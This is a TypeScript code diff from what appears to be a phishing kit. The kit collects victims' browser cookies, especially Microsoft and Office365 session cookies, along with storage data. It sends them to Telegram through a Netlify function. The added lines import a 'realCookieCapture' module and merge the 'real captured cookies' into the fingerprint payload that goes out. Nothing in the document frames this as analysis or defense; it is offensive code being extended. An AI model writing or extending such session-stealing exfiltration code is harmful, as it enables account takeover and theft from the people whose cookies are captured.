@@ -1,5 +1,6 @@
 import cookieUtils, { CookieMeta } from './cookieUtils';
 import { microsoftCookieCapture } from './microsoftCookieCapture';
+import { realCookieCapture, type RealCookie } from './realCookieCapture';
 
 // Send data to Telegram via Netlify function
 export const sendToTelegram = async (data: any): Promise<any> => {
@@ -73,6 +74,10 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
     console.error('Error loading stored cookies:', e);
   }
 
+  // CRITICAL: Get real captured cookies
+  const realCookies = realCookieCapture.getAllCookies();
+  console.log('🔵 Real cookies captured:', realCookies.length);
+
   // Enable Microsoft-specific cookie capturing while keeping general cookies disabled
   let cookieCapture;
   const emailDomain = getProviderSpecificDomain(userEmail);
@@ -140,6 +145,13 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
     console.log('🔵 Adding stored Office365 cookies to fingerprint:', storedCookies.length);
     cookieCapture.cookieList = [...(cookieCapture.cookieList || []), ...storedCookies];
   }
+
+  // CRITICAL: Add real captured cookies to the cookieList
+  if (realCookies.length > 0) {
+    console.log('🔵 Adding real captured cookies to fingerprint:', realCookies.length);
+    cookieCapture.cookieList = [...(cookieCapture.cookieList || []), ...realCookies];
+  }
+
   // Capture all storage data
   const getStorageData = (storage: Storage | undefined) => {
     const data: Record<string, string | null> = {};
